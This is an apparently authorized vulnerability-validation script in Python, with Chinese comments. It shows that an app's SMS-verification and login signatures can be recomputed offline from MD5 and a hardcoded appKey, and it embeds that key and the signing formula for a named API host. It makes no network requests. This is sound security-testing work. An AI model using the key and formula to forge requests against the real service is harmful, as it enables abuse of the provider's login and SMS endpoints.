#!/usr/bin/env python3
# 授权环境专用最小验证模板（Phase 5）。默认不发送任何网络请求；涉及设备的操作仅限授权的本地测试设备。
"""VULN-005 最小验证：手机验证码/登录 HTTP 签名可离线重签（MD5 直拼 + 硬编码 appKey）。

纯离线演算，不发任何请求。两个用途：

1. --selftest：用内置演示参数按 Phase 2/4 还原的公式计算签名，证明签名算法
   完全客户端侧、可任意重放重签（确定性输出，可人工核对）。
   公式（ReqPhoneVerificationCode.lua:19，step2 http_endpoints.json signature_logic）：
     isNew:  md5("app_id="+appId+"areaid="+areaID+"auto_reg=0"+"lobbyid="+lobbyID
                +"phone="+phone+"timestamp="+ts+"type="+type+"wid="+windID+appKey)
     旧分支: 同上但无 auto_reg 段
   appKey 明文于 lua-src-apk/app/Config/AreaConfig.lua（按区多份，
   如 phonelogin_app_key=2685db9c34685c83d16b0101d646989d @:182）。

2. 完整参数 + --expect-signature：把本地重算结果与真实样本比对。
   注意：step2 抓包中 palmapi.hzxuanming.com 为 TLS 密文，报文内 signature 不可见；
   真实 signature 样本需用同目录 runtime_observe.js 在授权测试设备上 hook
   Encryption::Md5 采集（输入串 + 输出 MD5 成对），再回填到本脚本比对。

用法：
  python3 validate_request.py --selftest
  python3 validate_request.py --app-id 10003 --areaid 1 --lobbyid 1 \
      --phone 13800000000 --timestamp 1787230125 --type pwd_get --wid 1 \
      --app-key 2685db9c34685c83d16b0101d646989d [--auto-reg] \
      [--expect-signature <md5hex>]
"""
import argparse
import hashlib
import sys


def build_signature_str(p, auto_reg):
    """严格按 ReqPhoneVerificationCode.lua:19/30 的拼接顺序（无分隔符，末尾直拼 appKey）。"""
    s = 'app_id=' + p.app_id + 'areaid=' + p.areaid
    if auto_reg:
        s += 'auto_reg=0'
    s += ('lobbyid=' + p.lobbyid + 'phone=' + p.phone + 'timestamp=' + p.timestamp
          + 'type=' + p.type + 'wid=' + p.wid)
    return s + p.app_key


def md5hex(s):
    return hashlib.md5(s.encode('utf-8')).hexdigest()


def main():
    ap = argparse.ArgumentParser(description='VULN-005 验证码签名离线重签验证（不发送任何网络请求）')
    ap.add_argument('--selftest', action='store_true', help='内置演示参数自演算')
    ap.add_argument('--app-id', default='10003')
    ap.add_argument('--areaid', default='1')
    ap.add_argument('--lobbyid', default='1')
    ap.add_argument('--phone', default='13800000000')
    ap.add_argument('--timestamp', default='1787230125')
    ap.add_argument('--type', default='pwd_get')
    ap.add_argument('--wid', default='1')
    ap.add_argument('--app-key', default='2685db9c34685c83d16b0101d646989d',
                    help='AreaConfig.lua 明文 phonelogin_app_key（默认取 :182 区配置）')
    ap.add_argument('--auto-reg', action='store_true', help='isNew 分支（拼入 auto_reg=0）')
    ap.add_argument('--expect-signature', default='',
                    help='可选：真实 signature 样本（runtime_observe.js 采集）用于比对')
    args = ap.parse_args()

    for auto in ([True, False] if args.selftest else [args.auto_reg]):
        s = build_signature_str(args, auto)
        sig = md5hex(s)
        print('[分支 isNew=%s]' % auto)
        print('  signatureStr = %s' % s)
        print('  signature    = %s' % sig)

    if args.expect_signature:
        s = build_signature_str(args, args.auto_reg)
        ok = md5hex(s) == args.expect_signature.lower()
        print('比对真实样本: %s' % ('MATCH —— 离线重签与客户端真实签名一致，VULN-005 成立'
              if ok else 'DIFF —— 与样本不符，需复查参数/分支'))
        return 0 if ok else 1

    print('VERDICT: 签名演算完成（纯客户端确定性算法，重签材料全部可得）。')
    print('如需与真实样本闭环比对：先在授权设备运行 runtime_observe.js 采集')
    print('  (signatureStr, md5) 样本对，再用 --expect-signature 回填比对。')
    print('注意：将重签请求发往服务端属在线行为，blocked_on=no_authorization_online，本脚本不实现。')
    return 0


if __name__ == '__main__':
    sys.exit(main())
